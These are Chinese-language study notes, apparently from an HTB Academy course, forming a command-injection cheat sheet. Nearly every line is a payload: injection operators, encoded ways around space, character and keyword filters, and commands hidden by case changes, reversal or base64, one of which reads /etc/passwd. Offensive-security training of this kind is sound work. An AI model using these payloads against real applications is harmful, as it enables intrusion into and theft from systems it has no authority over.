>[!info]
>- Command Injection
>- LDAP Injection
>- XSS Injection
## Command Injection
>[!warning ] 小節重點
>本章內容幾乎都來自HTB academy 
```bash
ping -c 1 127.0.0.1; whoami
```
### Inject Operator 
- AND Operator
```bash
ping -c 1 127.0.0.1 && whoami
```
- OR Operator
```bash
ping -c 1 127.0.0.1 || whoami
```
### 過濾機制辨識
> 透過交叉比對的方式，發現那些可以執行，一個一個搭配已知不會過濾的字串進行測試

- 過濾的要點
	- Space 
	- Character 
	- Command
### 空格過濾繞過
>如果過濾單純的space，那可以試試看這些指令
-  new-line character
```
ping 127.0.0.1%0a
```
- Spaces
```
ping 127.0.0.1%0a+
```
- tab
```
ping 127.0.0.1%0a%09
```
- $IFS
```
ping 127.0.0.1%0a${IFS}
```
### 字元過濾繞過
* Bypass `/` -- Linux
```bash
echo ${PATH:0:1}
```
- Bypass `;` -- Linux
```bash
echo ${LS_COLORS:10:1}
```
- Bypass `\` -- cmd
```bash
echo %HOMEPATH:~6,-11%
```
- Bypass `\` -- powershell
```powershell
$env:HOMEPATH[0]
```
### 指令過濾繞過
* Linux  and Windows 
```
w'h'o'am'i
w"h"o"am"i
```
- Windows
```cmd
who^ami
```
- Linux
```bash
who$@ami
w\ho\am\i
```
### 進階混淆指令
- 透過指令把大小寫修正
```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```
``` bash
ping 127.0.0.1%0a$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```
```bash
$(a="WhOaMi";printf %s "${a,,}")
```
- 透過反轉指令 -- linux
```bash
$(rev<<<'imaohw')
```
* 透過反轉指令 -- windows powershell 
```powershell
iex "$('imaohw'[-1..-20] -join '')"
```
* 透過base64 -- linux
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
- 透過base64 -- windows powershell 
```powershell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```
### 自動化攻擊工具
* [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
- [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)

